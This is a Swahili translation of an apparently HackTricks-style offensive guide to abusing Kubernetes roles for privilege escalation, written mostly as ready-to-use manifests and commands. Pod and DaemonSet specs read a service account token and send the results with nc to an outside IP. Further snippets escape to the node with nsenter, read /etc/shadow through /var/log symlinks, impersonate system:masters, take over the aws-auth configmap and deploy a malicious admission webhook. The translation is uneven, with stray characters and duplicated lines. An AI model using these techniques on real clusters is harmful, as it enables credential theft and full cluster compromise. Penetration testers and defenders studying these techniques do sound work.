# Abusing Roles/ClusterRoles in Kubernetes

{{#include ../../../banners/hacktricks-training.md}}

Hapa unaweza kupata baadhi ya mipangilio ya Roles na ClusterRoles ambayo inaweza kuwa hatari.\
Kumbuka kwamba unaweza kupata rasilimali zote zinazoungwa mkono kwa `kubectl api-resources`

## **Privilege Escalation**

Inarejelea sanaa ya kupata **ufikiaji wa principal tofauti** ndani ya klasta **ikiwa na mamlaka tofauti** (ndani ya klasta ya kubernetes au kwa mawingu ya nje) kuliko zile ulizo nazo tayari, katika Kubernetes kuna k基本 **mbinu 4 kuu za kupandisha mamlaka**:

- Kuwa na uwezo wa **kujifanya** mtumiaji/katika makundi/SAs wengine wenye mamlaka bora ndani ya klasta ya kubernetes au kwa mawingu ya nje
- Kuwa na uwezo wa **kuunda/kurekebisha/kutekeleza pods** ambapo unaweza **kupata au kuunganisha SAs** wenye mamlaka bora ndani ya klasta ya kubernetes au kwa mawingu ya nje
- Kuwa na uwezo wa **kusoma siri** kwani token za SAs zimehifadhiwa kama siri
- Kuwa na uwezo wa **kutoroka hadi kwenye node** kutoka kwenye kontena, ambapo unaweza kuiba siri zote za kontena zinazotembea kwenye node, akreditif za node, na ruhusa za node ndani ya wingu inayoendesha (ikiwa ipo)
- Mbinu ya tano ambayo inastahili kutajwa ni uwezo wa **kufanya port-forward** katika pod, kwani unaweza kuwa na uwezo wa kufikia rasilimali za kuvutia ndani ya pod hiyo.

### Access Any Resource or Verb (Wildcard)

**wildcard (\*) inatoa ruhusa juu ya rasilimali yoyote na kitenzi chochote**. Inatumika na wasimamizi. Ndani ya ClusterRole hii inamaanisha kwamba mshambuliaji anaweza kutumia anynamespace katika klasta
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Access Any Resource with a specific verb

Katika RBAC, ruhusa fulani zina hatari kubwa:

1. **`create`:** Inatoa uwezo wa kuunda rasilimali yoyote ya klasta, ikihatarisha kupanda kwa mamlaka.
2. **`list`:** Inaruhusu kuorodhesha rasilimali zote, ikihatarisha kuvuja kwa data nyeti.
3. **`get`:** Inaruhusu kufikia siri kutoka kwa akaunti za huduma, ikileta tishio la usalama.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Create - Steal Token

Mshambuliaji mwenye ruhusa za kuunda pod, anaweza kuunganisha Akaunti ya Huduma yenye mamlaka ndani ya pod na kuiba token ili kujifanya kuwa Akaunti ya Huduma. Kwa ufanisi inainua mamlaka kwake.

Mfano wa pod ambayo itakuwa na uwezo wa kuiba token ya akaunti ya huduma `bootstrap-signer` na kuisafirisha kwa mshambuliaji:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args:
[
"-c",
'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000',
]
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod Create & Escape

Ifuatayo inaonyesha haki zote ambazo kontena inaweza kuwa nazo:

- **Privileged access** (kuondoa ulinzi na kuweka uwezo)
- **Disable namespaces hostIPC and hostPid** ambazo zinaweza kusaidia kuongeza haki
- **Disable hostNetwork** namespace, ikitoa ufikiaji wa kuiba haki za wingu za nodi na ufikiaji bora wa mitandao
- **Mount hosts / inside the container**
```yaml:super_privs.yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
Unda pod na:
```bash
kubectl --token $token create -f mount_root.yaml
```
Mstari mmoja kutoka [hiki tweet](https://twitter.com/mauilion/status/1129468485480751104) na nyongeza kadhaa:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Sasa kwamba unaweza kukimbia hadi kwenye node angalia mbinu za baada ya unyakuzi katika:

#### Stealth

Huenda unataka kuwa **stealthier**, katika kurasa zinazofuata unaweza kuona kile ambacho unaweza kufikia ikiwa utaunda pod kwa kuwezesha baadhi ya ruhusa zilizotajwa katika kiolezo kilichopita:

- **Privileged + hostPID**
- **Privileged only**
- **hostPath**
- **hostPID**
- **hostNetwork**
- **hostIPC**

_Unaweza kupata mfano wa jinsi ya kuunda/kutumia vibaya mipangilio ya pods zilizopatiwa ruhusa katika_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Pod Create - Hamia kwenye wingu

Ikiwa unaweza **kuunda** **pod** (na hiari **akaunti ya huduma**) huenda ukawa na uwezo wa **kupata ruhusa katika mazingira ya wingu** kwa **kuteua majukumu ya wingu kwa pod au akaunti ya huduma** na kisha kuifikia.\
Zaidi ya hayo, ikiwa unaweza kuunda **pod yenye namespace ya mtandao wa mwenyeji** unaweza **kuiba IAM** jukumu la **node** instance.

Kwa maelezo zaidi angalia:

{{#ref}}
pod-escape-privileges.md
{{#endref}}

### **Create/Patch Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs and Cronjobs**

Inawezekana kutumia vibaya ruhusa hizi ili **kuunda pod mpya** na kuanzisha ruhusa kama katika mfano wa awali.

Yaml ifuatayo **inaunda daemonset na inatoa token ya SA** ndani ya pod:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args:
[
"-c",
'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000',
]
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** ni rasilimali katika kubernetes inayotumika kwa **kukimbia amri katika shell ndani ya pod**. Hii inaruhusu **kukimbia amri ndani ya kontena au kupata shell ndani**.

Hivyo, inawezekana **kuingia ndani ya pod na kuiba token ya SA**, au kuingia pod yenye mamlaka, kutoroka hadi kwenye node, na kuiba token zote za pods katika node na (ku)itumia node:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Ruhusa hii inaruhusu **kupeleka bandari moja ya ndani kwa bandari moja katika pod iliyoainishwa**. Hii inakusudia kuwezesha kufuatilia programu zinazotembea ndani ya pod kwa urahisi, lakini mshambuliaji anaweza kuitumia vibaya kupata ufikiaji wa programu za kuvutia (kama DBs) au programu zenye udhaifu (webs?) ndani ya pod:
```
kubectl port-forward pod/mypod 5000:5000
```
### Hosts Writable /var/log/ Escape

Kama [**ilivyosemwa katika utafiti huu**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), ikiwa unaweza kufikia au kuunda pod yenye **directory ya hosts `/var/log/` iliyowekwa** juu yake, unaweza **kutoroka kutoka kwenye kontena**.\
Hii ni kwa sababu wakati **Kube-API inajaribu kupata logi** za kontena (kwa kutumia `kubectl logs <pod>`), inafanya **ombwe la faili `0.log`** la pod kwa kutumia `/logs/` endpoint ya huduma ya **Kubelet**.\
Huduma ya Kubelet inatoa `/logs/` endpoint ambayo kimsingi ni **kuweka wazi mfumo wa faili wa `/var/log` wa kontena**.

Hivyo, mshambuliaji mwenye **ufikiaji wa kuandika katika folda /var/log/** ya kontena anaweza kutumia tabia hii kwa njia 2:

- Kubadilisha faili `0.log` la kontena lake (ambalo kawaida liko katika `/var/logs/pods/namespace_pod_uid/container/0.log`) kuwa **symlink inayotaja `/etc/shadow`** kwa mfano. Kisha, utaweza kuhamasisha faili la kivuli cha hosts kwa kufanya:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
- Ikiwa mshambuliaji anadhibiti kiongozi yeyote mwenye **idhini za kusoma `nodes/log`**, anaweza tu kuunda **symlink** katika `/host-mounted/var/log/sym` hadi `/` na wakati **anapofikia `https://<gateway>:10250/logs/sym/` atataja mfumo wa faili wa mizizi wa mwenyeji** (kubadilisha symlink kunaweza kutoa ufikiaji wa faili).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Maabara na exploit ya otomatiki inaweza kupatikana katika** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### Kupita ulinzi wa readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Ikiwa una bahati na uwezo wa juu wa `CAP_SYS_ADMIN upo, unaweza tu kuunganisha tena folda hiyo kama rw:
```bash
mount -o rw,remount /hostlogs/
```
#### Kupita ulinzi wa hostPath readOnly <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Kama ilivyoelezwa katika [**utafiti huu**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html) inawezekana kupita ulinzi:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Ambayo yalipangwa kuzuia kutoroka kama zile za awali kwa, badala ya kutumia mtego wa hostPath, kutumia PersistentVolume na PersistentVolumeClaim ili kuunganisha folda ya mwenyeji ndani ya kontena kwa ufikiaji wa kuandika:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: ["sh", "-c", "sleep 1h"]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Kujifanya kuwa akaunti zenye mamlaka**

Kwa [**kujifanya kuwa mtumiaji**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) mwenye mamlaka, mshambuliaji anaweza kujifanya kuwa akaunti yenye mamlaka.

Tumia tu parameter `--as=<username>` katika amri ya `kubectl` kujifanya kuwa mtumiaji, au `--as-group=<group>` kujifanya kuwa kundi:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Au tumia REST API:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Kuorodhesha Siri

Ruhusa ya **kuorodhesha siri inaweza kumruhusu mshambuliaji kusoma siri hizo** kwa kufikia kiunganishi cha REST API:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Kusoma siri – kujaribu nguvu za IDs za token

Wakati mshambuliaji mwenye token yenye ruhusa za kusoma anahitaji jina sahihi la siri ili kuweza kuitumia, tofauti na ruhusa pana ya _**kuorodhesha siri**_, bado kuna udhaifu. Akaunti za huduma za default katika mfumo zinaweza kuorodheshwa, kila moja ikihusishwa na siri. Siri hizi zina muundo wa jina: kiambatisho kisichobadilika kinachofuatiwa na token ya alphanumeric ya herufi tano za nasibu (bila herufi fulani) kulingana na [source code](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Token inazalishwa kutoka kwenye seti ndogo ya herufi 27 (`bcdfghjklmnpqrstvwxz2456789`), badala ya anuwai kamili ya alphanumeric. Kizuizi hiki kinapunguza jumla ya mchanganyiko unaowezekana kuwa 14,348,907 (27^5). Kwa hivyo, mshambuliaji anaweza kutekeleza shambulio la kujaribu nguvu ili kubaini token hiyo ndani ya masaa machache, ambayo inaweza kusababisha kupandishwa vyeo kwa kufikia akaunti za huduma nyeti.

### Maombi ya Kusaini Cheti

Ikiwa una vitenzi **`create`** katika rasilimali `certificatesigningrequests` (au angalau katika `certificatesigningrequests/nodeClient`). Unaweza **kuunda** CeSR mpya ya **node mpya.**

Kulingana na [nyaraka inawezekana kuidhinisha maombi haya kiotomatiki](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), hivyo katika hali hiyo **huhitaji ruhusa za ziada**. Ikiwa sivyo, unahitaji kuwa na uwezo wa kuidhinisha ombi, ambayo inamaanisha sasisha katika `certificatesigningrequests/approval` na `approve` katika `signers` na resourceName `<signerNameDomain>/<signerNamePath>` au `<signerNameDomain>/*`

Mfano wa **role** yenye ruhusa zote zinazohitajika ni:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Hivyo, na CSR mpya ya node iliyothibitishwa, unaweza **kuabusu** ruhusa maalum za nodes ili **kuchukua siri** na **kuinua mamlaka**.

Katika [**post hii**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) na [**hii moja**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/), usanidi wa GKE K8s TLS Bootstrap umewekwa na **kusainiwa kiotomatiki** na unatumika vibaya kuzalisha akreditif za Node mpya ya K8s na kisha kuabusu hizo ili kuinua mamlaka kwa kuchukua siri.\
Ikiwa **una ruhusa zilizotajwa unaweza kufanya kitu kama hicho**. Kumbuka kwamba mfano wa kwanza unazidi kosa linalozuia node mpya kufikia siri ndani ya kontena kwa sababu **node inaweza kufikia tu siri za kontena zilizowekwa juu yake.**

Njia ya kupita hii ni tu **kuunda akreditif za node kwa jina la node ambapo kontena lenye siri za kuvutia limewekwa** (lakini angalia tu jinsi ya kufanya hivyo katika post ya kwanza):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

Wajibu wanaoweza kubadilisha **`configmaps`** katika eneo la kube-system kwenye EKS (lazima wawe kwenye AWS) vikundi wanaweza kupata haki za usimamizi wa klasta kwa kubadilisha configmap ya **aws-auth**.\
Vitenzi vinavyohitajika ni **`update`** na **`patch`**, au **`create`** ikiwa configmap haijaundwa:
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
> [!WARNING]
> Unaweza kutumia **`aws-auth`** kwa **kuendelea** kutoa ufikiaji kwa watumiaji kutoka **akaunti nyingine**.
>
> Hata hivyo, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **haifanyi kazi kutoka akaunti tofauti**. Lakini kwa kweli `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` inafanya kazi ikiwa utaweka ARN ya klasta badala ya jina tu.\
> Ili kufanya `kubectl` ifanye kazi, hakikisha tu **unapanga** **kubeconfig ya waathirika** na katika arg za aws exec ongeza `--profile other_account_role` ili kubectl itumie profaili ya akaunti nyingine kupata token na kuwasiliana na AWS.

### Kuinua katika GKE

Kuna **njia 2 za kutoa ruhusa za K8s kwa wakuu wa GCP**. Katika hali yoyote mkuu pia anahitaji ruhusa **`container.clusters.get`** ili kuwa na uwezo wa kukusanya akidi za kufikia klasta, au utahitaji **kuunda faili yako ya kubectl config** (fuata kiungo kinachofuata).

> [!WARNING]
> Wakati unazungumza na kiunganishi cha K8s api, **token ya GCP itatumwa**. Kisha, GCP, kupitia kiunganishi cha K8s api, kwanza it **hakiki kama mkuu** (kwa barua pepe) **ana ufikiaji wowote ndani ya klasta**, kisha itahakiki kama ana **ufikiaji wowote kupitia GCP IAM**.\
> Ikiwa **yoyote** kati ya hizo ni **kweli**, atapewa **jibu**. Ikiwa **siyo** makosa **yanayopendekeza kutoa** **ruhusa kupitia GCP IAM** yatatolewa.

Kisha, njia ya kwanza ni kutumia **GCP IAM**, ruhusa za K8s zina **ruhusa sawa za GCP IAM**, na ikiwa mkuu ana hiyo, ataweza kuitumia.

{{#ref}}
../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md
{{#endref}}

Njia ya pili ni **kutoa ruhusa za K8s ndani ya klasta** kwa kutambua mtumiaji kwa **barua pepe** yake (akaunti za huduma za GCP zimejumuishwa).

### Kuunda token za serviceaccounts

Wakuu wanaoweza **kuunda TokenRequests** (`serviceaccounts/token`) Wakati wakizungumza na kiunganishi cha K8s api SAs (habari kutoka [**hapa**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token_request.rego)).

### ephemeralcontainers

Wakuu wanaoweza **`update`** au **`patch`** **`pods/ephemeralcontainers`** wanaweza kupata **utendaji wa msimbo kwenye pods nyingine**, na kwa uwezekano **kuvunja** kwenye node yao kwa kuongeza kontena ya muda mfupi yenye securityContext yenye mamlaka.

### ValidatingWebhookConfigurations au MutatingWebhookConfigurations

Wakuu wenye mojawapo ya vitenzi `create`, `update` au `patch` juu ya `validatingwebhookconfigurations` au `mutatingwebhookconfigurations` wanaweza kuwa na uwezo wa **kuunda mojawapo ya webhookconfigurations hizo** ili waweze **kuinua ruhusa**.

Kwa mfano wa [`mutatingwebhookconfigurations` angalia sehemu hii ya chapisho hili](./#malicious-admission-controller).

### Kuinua

Kama unavyoweza kusoma katika sehemu inayofuata: [**Kuzuia Kuinua Mamlaka ya Kijengwa Ndani**](./#built-in-privileged-escalation-prevention), mkuu cannot update wala kuunda roles au clusterroles bila kuwa na ruhusa hizo mpya. Isipokuwa ikiwa ana **kitenzi `escalate`** juu ya **`roles`** au **`clusterroles`.**\
Kisha anaweza kuupdate/kuunda roles mpya, clusterroles zenye ruhusa bora kuliko zile alizonazo.

### Nodes proxy

Wakuu wenye ufikiaji wa **`nodes/proxy`** subresource wanaweza **kutekeleza msimbo kwenye pods** kupitia Kubelet API (kulingana na [**hii**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes_proxy.rego)). Taarifa zaidi kuhusu uthibitishaji wa Kubelet katika ukurasa huu:

{{#ref}}
../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md
{{#endref}}

Una mfano wa jinsi ya kupata [**RCE ukizungumza na Kubelet API hapa**](../pentesting-kubernetes-services/#kubelet-rce).

### Futa pods + nodes zisizoweza kuwekewa ratiba

Wakuu wanaoweza **kufuta pods** (`delete` verb juu ya `pods` resource), au **kuhamasisha pods** (`create` verb juu ya `pods/eviction` resource), au **kubadilisha hali ya pod** (ufikiaji wa `pods/status`) na wanaweza **kufanya nodes nyingine zisizoweza kuwekewa ratiba** (ufikiaji wa `nodes/status`) au **kufuta nodes** (`delete` verb juu ya `nodes` resource) na ana udhibiti juu ya pod, wanaweza **kuiba pods kutoka nodes nyingine** ili ziweze **kutekelezwa** katika **node iliyoathirika** na mshambuliaji anaweza **kuiba token** kutoka kwa pods hizo.
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
### Hali za huduma (CVE-2020-8554)

Wajibu wanaoweza **kubadilisha** **`services/status`** wanaweza kuweka uwanja wa `status.loadBalancer.ingress.ip` ili kutumia **CVE-2020-8554 isiyorekebishwa** na kuanzisha **MiTM attacks dhidi ya kluster**. Mipango mingi ya kuzuia CVE-2020-8554 inazuia tu huduma za ExternalIP (kulingana na [**hii**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify_service_status_cve_2020_8554.rego)).

### Hali za Nodes na Pods

Wajibu wenye ruhusa za **`update`** au **`patch`** juu ya `nodes/status` au `pods/status`, wanaweza kubadilisha lebo ili kuathiri vikwazo vya kupanga vilivyowekwa.

## Kuzuia Kupanua Mamlaka kwa Njia ya Kijadi

Kubernetes ina [mekanismu ya ndani](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) ya kuzuia kupanua mamlaka.

Mfumo huu unahakikisha kwamba **watumiaji hawawezi kuongeza mamlaka zao kwa kubadilisha majukumu au uhusiano wa majukumu**. Utekelezaji wa sheria hii unafanyika katika ngazi ya API, ukitoa kinga hata wakati mthibitishaji wa RBAC haupo.

Sheria inasema kwamba **mtumiaji anaweza tu kuunda au kubadilisha jukumu ikiwa ana ruhusa zote zinazohitajika na jukumu hilo**. Zaidi ya hayo, upeo wa ruhusa za mtumiaji zilizopo lazima ulingane na ule wa jukumu wanajaribu kuunda au kubadilisha: ama kwa kiwango cha kluster kwa ClusterRoles au kufungwa kwenye namespace moja (au kwa kiwango cha kluster) kwa Roles.

> [!WARNING]
> Kuna ubaguzi wa sheria iliyopita. Ikiwa wajibu ana **kitenzi `escalate`** juu ya **`roles`** au **`clusterroles`** anaweza kuongeza mamlaka ya majukumu na clusterroles hata bila kuwa na ruhusa hizo mwenyewe.

### **Pata & Patch RoleBindings/ClusterRoleBindings**

> [!CAUTION]
> **Kwa kweli mbinu hii ilifanya kazi hapo awali, lakini kulingana na majaribio yangu haifanyi kazi tena kwa sababu ile ile iliyoelezwa katika sehemu iliyopita. Huwezi kuunda/kubadilisha rolebinding ili kujipa wewe mwenyewe au SA tofauti baadhi ya mamlaka ikiwa tayari huna.**

Ruhusa ya kuunda Rolebindings inamruhusu mtumiaji **kuunganisha majukumu na akaunti ya huduma**. Ruhusa hii inaweza kupelekea kupanua mamlaka kwa sababu inaruhusu mtumiaji kuunganisha mamlaka ya usimamizi kwa akaunti ya huduma iliyovunjika.

## Mashambulizi Mengine

### Programu ya proxy ya Sidecar

Kwa kawaida hakuna usimbuaji katika mawasiliano kati ya pods. Uthibitishaji wa pamoja, wa pande mbili, kutoka pod hadi pod.

#### Unda programu ya proxy ya sidecar <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Unda yako .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Hariri .yaml yako na ongeza mistari isiyo na maoni:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command:
[
"sh",
"-c",
"apt update && apt install iptables -y && iptables -L && sleep 1h",
]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Tazama kumbukumbu za proxy:
```bash
kubectl logs app -C proxy
```
More info at: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Malicious Admission Controller

Msimamizi wa kuingia **anakatisha maombi kwa seva ya API ya Kubernetes** kabla ya kudumu kwa kitu, lakini **baada ya ombi kuthibitishwa** **na kuidhinishwa**.

Ikiwa mshambuliaji kwa namna fulani anafanikiwa **kuingiza Msimamizi wa Kuingia wa Mabadiliko**, ataweza **kubadilisha maombi ambayo tayari yameidhinishwa**. Kuwa na uwezo wa kuweza privesc, na kwa kawaida kudumu katika klasta.

**Mfano kutoka** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Angalia hali ili kuona kama iko tayari:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format&format=webp)

Kisha peleka pod mpya:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Wakati unaweza kuona kosa la `ErrImagePull`, angalia jina la picha kwa moja ya maswali yafuatayo:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format&format=webp)

Kama unavyoona kwenye picha hapo juu, tulijaribu kuendesha picha `nginx` lakini picha iliyotekelezwa mwishowe ni `rewanthtammana/malicious-image`. Nini kimetokea!!?

#### Technicalities <a href="#heading-technicalities" id="heading-technicalities"></a>

Scripti `./deploy.sh` inaanzisha mutating webhook admission controller, ambayo inabadilisha maombi kwa API ya Kubernetes kama ilivyoainishwa katika mistari yake ya usanidi, ikihusisha matokeo yanayoonekana:
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
Snippet iliyo hapo juu inabadilisha picha ya kwanza ya kontena katika kila pod na `rewanthtammana/malicious-image`.

## OPA Gatekeeper bypass

{{#ref}}
../kubernetes-opa-gatekeeper/kubernetes-opa-gatekeeper-bypass.md
{{#endref}}

## Best Practices

### **Kuzima Automount ya Tokens za Akaunti ya Huduma**

- **Pods na Akaunti za Huduma**: Kwa default, pods zina mount token ya akaunti ya huduma. Ili kuboresha usalama, Kubernetes inaruhusu kuzima kipengele hiki cha automount.
- **Jinsi ya Kutumia**: Weka `automountServiceAccountToken: false` katika usanidi wa akaunti za huduma au pods kuanzia toleo la Kubernetes 1.6.

### **Kuteua Watumiaji kwa Uangalifu katika RoleBindings/ClusterRoleBindings**

- **Injini ya Uchaguzi**: Hakikisha kuwa watumiaji muhimu pekee wanajumuishwa katika RoleBindings au ClusterRoleBindings. Kagua mara kwa mara na uondoe watumiaji wasiohusika ili kudumisha usalama mkali.

### **Majukumu Maalum ya Namespace Badala ya Majukumu ya Kiwango cha Klasta**

- **Majukumu vs. ClusterRoles**: Prefer kutumia Majukumu na RoleBindings kwa ruhusa maalum za namespace badala ya ClusterRoles na ClusterRoleBindings, ambazo zinatumika kwa kiwango cha klasta. Njia hii inatoa udhibiti wa kina na inapunguza wigo wa ruhusa.

### **Tumia zana za kiotomatiki**

{{#ref}}
https://github.com/cyberark/KubiScan
{{#endref}}

{{#ref}}
https://github.com/aquasecurity/kube-hunter
{{#endref}}
